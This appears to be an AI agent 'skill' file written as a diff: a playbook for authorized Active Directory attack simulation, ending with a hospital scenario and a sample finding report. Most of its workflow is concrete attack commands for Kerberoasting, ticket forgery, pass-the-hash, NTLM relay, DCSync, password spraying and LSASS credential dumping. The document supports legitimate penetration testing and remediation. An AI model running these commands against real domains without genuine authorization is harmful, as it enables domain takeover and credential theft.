@@ -1,0 +1,213 @@
+\title{Executing Active Directory Attack Simulation}
+
+\taxon{skill}
+
+\tag{Active-Directory}
+
+\tag{BloodHound}
+
+\tag{Mimikatz}
+
+\tag{Kerberoasting}
+
+\tag{domain-compromise}
+
+\meta{version}{1.0.0}
+
+\meta{description}{Executes authorized attack simulations against Active Directory environments to identify misconfigurations, weak credentials, dangerous privilege paths, and exploitable trust relationships that could lead to domain compromise. The tester uses BloodHound for attack path analysis, Mimikatz for credential extraction, and Impacket for protocol-level attacks including Kerberoasting, AS-REP Roasting, and delegation abuse. Activates for requests involving Active Directory pentest, AD attack simulation, domain compromise testing, or Kerberos attack assessment.}
+
+\subtree{
+\title{Executing Active Directory Attack Simulation}
+\subtree{
+\title{When to Use}
+\ul{
+\li{Assessing the security of an Active Directory domain and forest against common and advanced attack techniques}
+\li{Identifying attack paths from low-privilege domain user to Domain Admin using privilege relationship analysis}
+\li{Validating that Kerberos security configurations, credential policies, and delegation settings resist known attacks}
+\li{Testing detection capabilities of the SOC and EDR tools against Active Directory-specific TTPs}
+\li{Evaluating the effectiveness of tiered administration models and privileged access workstations}
+}
+
+\p{\strong{Do not use} without explicit written authorization from the domain owner, against production domain controllers during business hours unless approved, or for testing that could cause account lockouts affecting real users without prior coordination.}
+}
+
+\subtree{
+\title{Prerequisites}
+\ul{
+\li{Written authorization specifying the target AD domain, testing constraints, and any off-limits accounts or systems}
+\li{Low-privilege domain user account (minimum starting point) to simulate realistic attacker position}
+\li{Testing workstation joined to the domain or network access to domain controllers on ports 88, 135, 139, 389, 445, 636, 3268, 3269}
+\li{BloodHound Community Edition or Enterprise with SharpHound/AzureHound collectors}
+\li{Impacket toolkit, Mimikatz (or pypykatz), Rubeus, and CrackMapExec installed on the attack platform}
+\li{Hashcat or John the Ripper with current wordlists (rockyou.txt, SecLists) for offline credential cracking}
+}
+}
+
+\subtree{
+\title{Workflow}
+\subtree{
+\title{Step 1: Active Directory Reconnaissance}
+\p{Enumerate the AD environment from a low-privilege domain user position:}
+
+\ul{
+\li{\strong{Domain enumeration}: \code{\startverb Get-ADDomain\stopverb} or \code{\startverb crackmapexec smb <dc_ip> -u <user> -p <pass> --domains\stopverb} to identify domain name, functional level, domain controllers, and forest trusts}
+\li{\strong{User enumeration}: \code{\startverb Get-ADUser -Filter * -Properties ServicePrincipalName,AdminCount,PasswordLastSet\stopverb} to identify service accounts, privileged accounts, and stale passwords}
+\li{\strong{Group enumeration}: Map membership of high-value groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators) using \code{\startverb net group "Domain Admins" /domain\stopverb}}
+\li{\strong{GPO enumeration}: \code{\startverb Get-GPO -All | Get-GPOReport -ReportType XML\stopverb} to identify Group Policy configurations including password policies, audit settings, and software deployment}
+\li{\strong{Trust enumeration}: \code{\startverb nltest /domain_trusts /all_trusts\stopverb} to map inter-domain and inter-forest trusts, noting trust direction and transitivity}
+\li{\strong{LDAP queries}: Use \code{\startverb ldapsearch\stopverb} or ADExplorer to search for accounts with \code{\startverb userAccountControl\stopverb} flags indicating "password never expires", "password not required", or "DES-only Kerberos"}
+}
+}
+
+\subtree{
+\title{Step 2: BloodHound Attack Path Analysis}
+\p{Collect and analyze AD relationship data to identify the shortest paths to Domain Admin:}
+
+\ul{
+\li{Run SharpHound collector: \code{\startverb SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\startverb \temp\stopverb\\stopverb} to collect users, groups, sessions, ACLs, trusts, and GPO data}
+\li{Import the JSON output into BloodHound and run built-in queries:}
+\li{"Shortest Paths to Domain Admins from Owned Principals"}
+\li{"Find Principals with DCSync Rights"}
+\li{"Find Computers where Domain Users are Local Admin"}
+\li{"Shortest Paths to Unconstrained Delegation Systems"}
+\li{"Find All Paths from Kerberoastable Users"}
+\li{Mark the compromised user as "owned" in BloodHound and analyze the resulting attack paths}
+\li{Identify ACL-based attack paths: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword on high-value objects}
+\li{Document each identified attack path with the chain of relationships and affected objects}
+}
+}
+
+\subtree{
+\title{Step 3: Kerberos Attacks}
+\p{Execute Kerberos-based attacks against identified vulnerable accounts:}
+
+\ul{
+\li{\strong{Kerberoasting}: Request TGS tickets for accounts with SPNs: \code{\startverb impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast.hashes\stopverb}. Crack offline with \code{\startverb hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt\stopverb}}
+\li{\strong{AS-REP Roasting}: Target accounts without Kerberos pre-authentication: \code{\startverb impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile asrep.hashes\stopverb}. Crack with \code{\startverb hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt\stopverb}}
+\li{\strong{Silver Ticket}: If a service account's NTLM hash is cracked, forge a TGS ticket for that service using \code{\startverb impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn <service/host> <username>\stopverb}}
+\li{\strong{Golden Ticket}: If the krbtgt hash is obtained (post-domain compromise), forge a TGT: \code{\startverb mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /ticket:golden.kirbi"\stopverb}}
+\li{\strong{Unconstrained Delegation abuse}: Identify computers with unconstrained delegation. Coerce authentication from a Domain Controller using PrinterBug or PetitPotam, then capture the DC's TGT from memory.}
+}
+}
+
+\subtree{
+\title{Step 4: Credential Attacks and Lateral Movement}
+\p{Exploit harvested credentials to move through the domain:}
+
+\ul{
+\li{\strong{Pass-the-Hash}: \code{\startverb impacket-psexec <domain>/<user>@<target> -hashes <LM:NTLM>\stopverb} to execute commands on systems where the compromised account has local admin}
+\li{\strong{Pass-the-Ticket}: \code{\startverb export KRB5CCNAME=ticket.ccache && impacket-psexec <domain>/<user>@<target> -k -no-pass\stopverb} to use captured or forged Kerberos tickets}
+\li{\strong{NTLM Relay}: Configure \code{\startverb impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <user>\stopverb} and coerce authentication to relay NTLM credentials for privilege escalation}
+\li{\strong{DCSync}: If DCSync rights are obtained (Replicating Directory Changes): \code{\startverb impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm\stopverb} to dump all domain password hashes}
+\li{\strong{Password spraying}: \code{\startverb crackmapexec smb <dc_ip> -u users.txt -p 'Winter2025!' --no-bruteforce\stopverb} testing one password across all accounts to avoid lockouts}
+\li{\strong{LSASS dump}: On compromised hosts, extract credentials from LSASS memory using \code{\startverb mimikatz "sekurlsa::logonpasswords"\stopverb} or \code{\startverb procdump -ma lsass.exe lsass.dmp\stopverb} followed by offline extraction}
+}
+}
+
+\subtree{
+\title{Step 5: Privilege Escalation to Domain Admin}
+\p{Chain discovered attack paths to escalate from low-privilege user to Domain Admin:}
+
+\ul{
+\li{Follow the shortest path identified in BloodHound by executing each relationship (e.g., GenericWrite on a user -> set SPN -> Kerberoast -> crack password -> user is member of a group with WriteDACL on Domain Admins -> grant self membership)}
+\li{Exploit Group Policy Preferences (GPP) passwords if found: \code{\startverb crackmapexec smb <dc_ip> -u <user> -p <pass> -M gpp_autologon\stopverb}}
+\li{Target LAPS (Local Administrator Password Solution) if deployed: query LAPS passwords with \code{\startverb Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd\stopverb}}
+\li{Abuse certificate services (AD CS) with Certipy: \code{\startverb certipy find -vulnerable -u <user>@<domain> -p <pass> -dc-ip <dc_ip>\stopverb} to find exploitable certificate templates (ESC1-ESC8)}
+\li{Document the complete attack chain from initial user to Domain Admin with every credential, tool, and technique used}
+}
+}
+}
+
+\subtree{
+\title{Key Concepts}
+\pre{\startverb
+| Term | Definition |
+|------|------------|
+| **Kerberoasting** | Requesting Kerberos TGS tickets for accounts with Service Principal Names and cracking them offline to recover the service account's plaintext password |
+| **AS-REP Roasting** | Requesting Kerberos AS-REP responses for accounts without pre-authentication enabled and cracking the encrypted timestamp offline |
+| **DCSync** | Using Directory Replication Service privileges (DS-Replication-Get-Changes-All) to replicate password data from a domain controller, mimicking the behavior of a DC |
+| **BloodHound** | Graph-based Active Directory analysis tool that maps privilege relationships and identifies attack paths from any user to high-value targets like Domain Admin |
+| **Unconstrained Delegation** | A Kerberos delegation configuration where a service can impersonate any user to any other service, allowing TGT capture from connecting users |
+| **Pass-the-Hash** | Authentication technique using an NTLM hash directly instead of the plaintext password, exploiting Windows NTLM authentication |
+| **AD CS Abuse** | Exploiting misconfigured Active Directory Certificate Services templates to request certificates that grant elevated privileges or impersonate other users |
+| **NTLM Relay** | Forwarding captured NTLM authentication to a different service to authenticate as the victim, effective when SMB signing is not enforced |
+\stopverb}
+}
+
+\subtree{
+\title{Tools & Systems}
+\ul{
+\li{\strong{BloodHound}: Attack path analysis tool that ingests AD data collected by SharpHound to visualize and identify privilege escalation paths through object relationships}
+\li{\strong{Impacket}: Python toolkit for network protocol interactions including Kerberos attacks (GetUserSPNs, GetNPUsers), credential dumping (secretsdump), and remote execution (psexec, wmiexec)}
+\li{\strong{Mimikatz}: Post-exploitation tool for extracting plaintext credentials, NTLM hashes, and Kerberos tickets from Windows memory (LSASS process)}
+\li{\strong{CrackMapExec}: Multi-protocol attack tool for Active Directory environments supporting SMB, LDAP, WinRM, and MSSQL with built-in modules for password spraying and enumeration}
+\li{\strong{Certipy}: Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations}
+}
+}
+
+\subtree{
+\title{Common Scenarios}
+\subtree{
+\title{Scenario: Domain Compromise Assessment for a Healthcare Organization}
+\p{\strong{Context}: A hospital network with a single Active Directory forest containing 5,000 user accounts, 800 computer objects, and 15 domain controllers across 3 sites. The tester starts with a single low-privilege domain user account. The goal is to determine if an attacker with stolen employee credentials could escalate to Domain Admin.}
+
+\p{\strong{Approach}:}
+
+\ol{
+\li{Run SharpHound to collect AD relationship data and import into BloodHound}
+\li{BloodHound reveals a path: owned user -> member of IT-Support group -> GenericAll on SVC-SQL account -> SVC-SQL has SPN -> Kerberoast -> SVC-SQL is local admin on DB-SERVER-01 -> DB-SERVER-01 has a Domain Admin session}
+\li{Kerberoast SVC-SQL, crack the weak password (Summer2023!) in 12 minutes using hashcat}
+\li{Use SVC-SQL credentials to access DB-SERVER-01 via psexec}
+\li{Extract Domain Admin credentials from LSASS memory on DB-SERVER-01}
+\li{Validate domain compromise by performing DCSync to dump all domain hashes}
+\li{Report the complete attack chain with remediation: set 25+ character passwords on service accounts, enable AES-only Kerberos encryption, remove unnecessary local admin rights, implement tiered administration}
+}
+
+\p{\strong{Pitfalls}:}
+
+\ul{
+\li{Running SharpHound with noisy collection methods during peak hours, alerting the SOC via excessive LDAP queries}
+\li{Password spraying without checking the domain lockout policy first, locking out hundreds of accounts}
+\li{Forgetting to test for AD CS vulnerabilities which often provide the fastest path to Domain Admin}
+\li{Not checking for stale computer accounts that may still have cached credentials or active sessions}
+}
+}
+}
+
+\subtree{
+\title{Output Format}
+\pre{\startverb
+## Finding: Service Account Vulnerable to Kerberoasting with Weak Password
+
+**ID**: AD-002
+**Severity**: Critical (CVSS 9.1)
+**Affected Object**: SVC-SQL@corp.example.com (Service Account)
+**Attack Technique**: MITRE ATT&CK T1558.003 - Kerberoasting
+
+**Description**:
+The service account SVC-SQL has a Service Principal Name (MSSQLSvc/db-server-01.corp.example.com:1433)
+registered in Active Directory and uses a weak password that was cracked in 12 minutes
+using hashcat with the rockyou.txt wordlist. This account has local administrator
+privileges on DB-SERVER-01, which had an active Domain Admin session at the time of
+testing.
+
+**Attack Chain**:
+1. Requested TGS ticket: impacket-GetUserSPNs corp.example.com/testuser:password -request
+2. Cracked hash: hashcat -m 13100 hash.txt rockyou.txt (cracked in 12m: Summer2023!)
+3. Lateral movement: impacket-psexec corp.example.com/SVC-SQL:Summer2023!@db-server-01
+4. Credential extraction: mimikatz sekurlsa::logonpasswords -> Domain Admin NTLM hash
+
+**Impact**:
+Complete domain compromise from a single low-privilege domain user account. An attacker
+could access all 5,000 user accounts, 800 computer objects, and all data within the domain.
+
+**Remediation**:
+1. Set a 25+ character randomly generated password for SVC-SQL and all service accounts
+2. Migrate to Group Managed Service Accounts (gMSA) which rotate 120-character passwords automatically
+3. Enable AES256 encryption for Kerberos and disable RC4 (DES) encryption
+4. Remove SVC-SQL from local administrator groups on DB-SERVER-01
+5. Implement Protected Users group for privileged accounts to prevent credential caching
+6. Deploy Microsoft Defender for Identity to detect Kerberoasting and DCSync attacks
+\stopverb}
+}
+}
